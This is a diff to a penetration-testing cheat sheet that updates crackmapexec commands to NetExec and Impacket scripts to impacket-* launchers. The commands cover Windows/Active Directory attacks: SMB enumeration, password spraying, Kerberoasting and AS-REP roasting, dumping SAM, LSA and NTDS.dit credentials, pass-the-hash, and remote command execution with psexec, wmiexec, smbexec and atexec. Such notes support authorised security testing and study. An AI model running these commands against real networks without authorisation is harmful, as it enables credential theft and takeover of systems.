@@ -583,7 +583,7 @@ ssh -i id_rsa -D 9050 adminuser@10.10.155.5 #SOCKS proxy port
 
 #Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
 
-proxychains4 crackmapexec smb 10.10.10.0/24 #Example
+proxychains4 nxc smb 10.10.10.0/24 #Example
 ```
 
 ## Dealing with Passwords
@@ -611,31 +611,33 @@ admin@123
 
 ## Impacket
 
+> The commands below use the `impacket-*` launchers provided by Kali's Impacket package. When running directly from an upstream source checkout, the equivalent example filenames end in `.py`.
+
 ```bash
-smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
+impacket-smbclient <domain>/<user>:<password>@<target-ip> #connect to the server rather than a specific share
 
-lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target
+impacket-lookupsid <domain>/<user>:<password>@<target-ip> #enumerate SIDs on the target
 
-services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration
+impacket-services <domain>/<user>:<password>@<target-ip> list #enumerate services
 
-secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
+impacket-secretsdump <domain>/<user>:<password>@<target-ip> #dump secrets from the target
 
-GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
+impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request #request Kerberoastable TGS tickets
 
-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
+impacket-GetNPUsers <domain>/ -dc-ip <dc-ip> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #AS-REP roasting with a username list
 
 ##RCE
-psexec.py test.local/john:password123@10.10.10.1
-psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+impacket-psexec test.local/john:password123@10.10.10.1
+impacket-psexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1
 
-wmiexec.py test.local/john:password123@10.10.10.1
-wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+impacket-wmiexec test.local/john:password123@10.10.10.1
+impacket-wmiexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1
 
-smbexec.py test.local/john:password123@10.10.10.1
-smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+impacket-smbexec test.local/john:password123@10.10.10.1
+impacket-smbexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1
 
-atexec.py test.local/john:password123@10.10.10.1 <command>
-atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
+impacket-atexec test.local/john:password123@10.10.10.1 <command>
+impacket-atexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1 <command>
 
 ```
 
@@ -822,14 +824,14 @@ nmap -p445 --script="name" $IP
 #In windows we can view like this
 net view \\<computername/IP> /all
 
-#crackmapexec
-crackmapexec smb <IP/range>  
-crackmapexec smb 192.168.1.100 -u username -p password
-crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
-crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
-crackmapexec smb 192.168.1.100 -u username -p password --all #all information
-crackmapexec smb 192.168.1.100 -u username -p password --port 445 --shares #specific port
-crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
+#NetExec
+nxc smb <IP/range>
+nxc smb 192.168.1.100 -u username -p password
+nxc smb 192.168.1.100 -u username -p password --shares #lists available shares
+nxc smb 192.168.1.100 -u username -p password --users #lists domain users
+nxc smb 192.168.1.100 -u username -p password --pass-pol #shows the domain password policy
+nxc smb 192.168.1.100 -u username -p password --port 445 --shares #specific port
+nxc smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
 #Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
 
 # Smbclient
@@ -2013,11 +2015,11 @@ https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords
 grep -inr "cpassword"
 ```
 
-- Crackmapexec
+- NetExec
 
 ```bash
-crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
-crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
+nxc smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+nxc smb <TARGET[s]> -u <USERNAME> -H <LMHASH>:<NTHASH> -d <DOMAIN> -M gpp_password
 ```
 
 - Decrypting the CPassword
@@ -2041,8 +2043,8 @@ gpp-decrypt "cpassword"
 ### Password Spraying
 
 ```powershell
-# Crackmapexec - check if the output shows 'Pwned!'
-crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
+# NetExec - administrative access is indicated by "Pwn3d!"
+nxc smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #continue testing after a successful authentication
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
@@ -2123,15 +2125,15 @@ ps> iwr -UseDefaultCredentials <servicename>://<computername>
 ### Secretsdump
 
 ```powershell
-secretsdump.py <domain>/<user>:<password>@<IP>
-secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
-secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
+impacket-secretsdump <domain>/<user>:<password>@<IP>
+impacket-secretsdump -hashes <LMHASH>:<NTHASH> <user>@<IP> #local user (domain omitted)
+impacket-secretsdump -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> #domain user
 ```
 
 ### Dumping NTDS.dit
 
 ```bash
-secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
+impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<IP>
 #use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
 ```
 
@@ -2145,23 +2147,23 @@ secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 > 
 
 ```powershell
-psexec.py <domain>/<user>:<password1>@<IP>
+impacket-psexec <domain>/<user>:<password>@<IP>
 # the user should have write access to Admin share then only we can get sesssion
 
-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+impacket-psexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
 #we passed full hash here
 
-smbexec.py <domain>/<user>:<password1>@<IP>
+impacket-smbexec <domain>/<user>:<password>@<IP>
 
-smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+impacket-smbexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
 #we passed full hash here
 
-wmiexec.py <domain>/<user>:<password1>@<IP>
+impacket-wmiexec <domain>/<user>:<password>@<IP>
 
-wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
+impacket-wmiexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
 #we passed full hash here
 
-atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
+impacket-atexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
 #we passed full hash here
 ```
 
@@ -2173,52 +2175,45 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this on windows session
 ```
 
-### crackmapexec
+### NetExec
 
-- If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
-
-```powershell
-crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
-crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
-crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
-crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
-
-#Try --local-auth option if nothing comes up
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
-crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
-crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command
-
-#Pass the hash
-crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
-#We can run all the above commands with hash and obtain more information
-
-#crackmapexec modules
-crackmapexec smb -L #listing modules
-crackmapexec smb -M mimikatz --options #shows the required options for the module
-crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
-crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
-```
-
-- Crackmapexec database
+- NetExec is the maintained successor to CrackMapExec. Refer to the [official wiki](https://www.netexec.wiki/) for current protocol and option support.
 
 ```bash
-cmedb #to launch the console
-help #run this command to view some others, running individual commands give infor on all the data till now we did.
+nxc <protocol> --help #for example: nxc smb --help
+nxc smb <Rhost/range> -u user.txt -p password.txt --continue-on-success #test credential lists and continue after successes
+nxc smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #filter successful results
+nxc smb <Rhost/range> -u user.txt -p 'password' --continue-on-success #password spraying
+
+#Try --local-auth option if nothing comes up
+nxc smb <Rhost/range> -u 'user' -p 'password' --shares #list shares and access
+nxc smb <Rhost/range> -u 'user' -p 'password' --disks #enumerate disks
+nxc smb <DC-IP> -u 'user' -p 'password' --users #enumerate domain users
+nxc smb <Rhost/range> -u 'user' -p 'password' --smb-sessions #enumerate active SMB sessions
+nxc smb <Rhost/range> -u 'user' -p 'password' --loggedon-users #enumerate logged-on users
+nxc smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dump password policy
+nxc smb <Rhost/range> -u 'user' -p 'password' --sam #dump SAM hashes; requires administrative access
+nxc smb <Rhost/range> -u 'user' -p 'password' --lsa #dump LSA secrets; requires administrative access
+nxc smb <DC-IP> -u 'user' -p 'password' --ntds #dump NTDS data from a domain controller; requires sufficient privileges
+nxc smb <Rhost/range> -u 'user' -p 'password' --groups '<groupname>' #enumerate a domain group and its members
+nxc smb <Rhost/range> -u 'user' -p 'password' -x 'command' #use -x for CMD or -X for PowerShell
+
+#Pass the hash
+nxc smb <ip or range> -u username -H <NTHASH> --local-auth
+#We can run all the above commands with hash and obtain more information
+
+#NetExec modules
+nxc smb -L #list SMB modules
+nxc smb -M gpp_password --options #show options for an installed module
+nxc smb <Rhost> -u 'user' -p 'password' -M gpp_password #run the module
 ```
-### netexec
-Similar to Crackmap it's archived <a href="https://www.netexec.wiki/getting-started/target-formats">Netexec wiki</a>
-```
-netexec <protocol> ~/targets.txt
-netexec <protocol> <target(s)> -u username1 -p password1 password2
-netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
-sudo nxc smb <TARGET> -k -u USER -p PASS
+
+- NetExec database
+
+```bash
+nxcdb #launch the database console
+help #list console commands
+proto smb #select the SMB protocol database
 ```
 ### kpcli - KeePass password manager
 Found the Database.kdbx file in the smb enumeration
